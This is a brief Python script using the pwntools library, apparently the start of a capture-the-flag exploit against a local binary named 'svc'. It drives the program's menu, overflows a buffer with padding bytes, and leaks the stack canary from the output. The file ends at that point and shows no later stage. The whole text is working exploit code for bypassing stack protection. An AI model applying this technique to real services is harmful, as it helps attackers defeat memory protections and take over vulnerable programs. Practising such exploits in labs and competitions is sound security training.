from pwn import *

target = process("./svc")

target.sendline("1")
target.recvuntil(">>")

target.sendline("a" * 160 + 'b' * 9)

target.recvuntil(">>")

target.sendline("2")
target.recvuntil("b" * 9)
canary = u64("\x00" + target.recv(7))




